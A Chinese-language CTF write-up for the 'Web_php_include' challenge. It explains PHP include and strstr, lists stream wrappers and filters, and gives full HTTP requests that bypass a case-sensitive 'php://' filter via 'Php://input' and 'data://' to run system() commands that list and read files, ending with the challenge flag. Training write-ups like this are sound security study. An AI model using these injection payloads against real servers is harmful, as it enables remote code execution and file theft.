# Web_php_include

> 首先可看到这是通过传递hello和page参数来完成,从源码可看到对hello参数没要求,随便一个值就行,关键是page参数,不能使用php://协议,可使用Php://或者data://绕过

## 涉及函数

### include

> 从外部引入php文件并执行,如果执行不成功,就返回文件的源码

### strstr

> strstr(string,search,before_search),函数是区分大小写,用来查找search在string中是否存在,如果是,返回该字符串及后面剩余部分.


## PHP文件包含漏洞常用伪协议

```
file:// 访问本地文件系统
http:// 访问http(s）网址
ftp:// 访问ftp
php:// 访问各个输入/输出流
zlib:// 压缩流
data:// 数据
rar:// RAR压缩包
ogg:// 音频流
```

## filters类型

> String Filters: string.rot13、string.toupper、string.tolower、string.strip_tags

> Conversion Filters: convert.base64-encode & convert.base64-decode、convert.quoted-printable-encode & convert.quoted-printable-decode、convert.iconv.*

> Compression Filters: zlib.deflate、zlib.inflate、bzip2.compress和bzip2.decompress

> Encryption Filters: mcrypt.*和 mdecrypt.*

> [官方文档]https://www.php.net/manual/zh/filters.php

> [使用参考](https://blog.csdn.net/qq_44657899/article/details/109300335)

## filters支持编码

```
UCS-4*
UCS-4BE
UCS-4LE*
UCS-2
UCS-2BE
UCS-2LE
UTF-32*
UTF-32BE*
UTF-32LE*
UTF-16*
UTF-16BE*
UTF-16LE*
UTF-7
UTF7-IMAP
UTF-8*
ASCII*
EUC-JP*
SJIS*
eucJP-win*
SJIS-win*
...
```

> [官方文档](https://www.php.net/manual/zh/mbstring.supported-encodings.php)

## 思路分析

> 通过代码可以分析得到,是通过传递hello和page参数来完成,从源码可看到对hello参数没要求,随便一个值就行,关键是page参数,不能使用php://,代码会把php://替换为空,但是strstr区分大小写,可以使用Php://input绕过,或者使用data://伪协议.

## payload1

```
POST /?hello=1&page=Php://input HTTP/1.1
Host: 61.147.171.105:65108
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 20

<?php system("ls")?>

POST /?hello=1&page=Php://input HTTP/1.1
Host: 61.147.171.105:65108
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 40

<?php system("cat fl4gisisish3r3.php")?>
```

## payload2

```
GET /?hello=1&page=data://text/plain,%3C?php%20print_r(glob(%22*%22));%20?%3E HTTP/1.1
Host: 61.147.171.105:65108
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

GET /?hello=1&page=data://text/plain,%3C?php%20system(%22cat%20fl4gisisish3r3.php%22)?%3E HTTP/1.1
Host: 61.147.171.105:65108
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

## flag

> ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}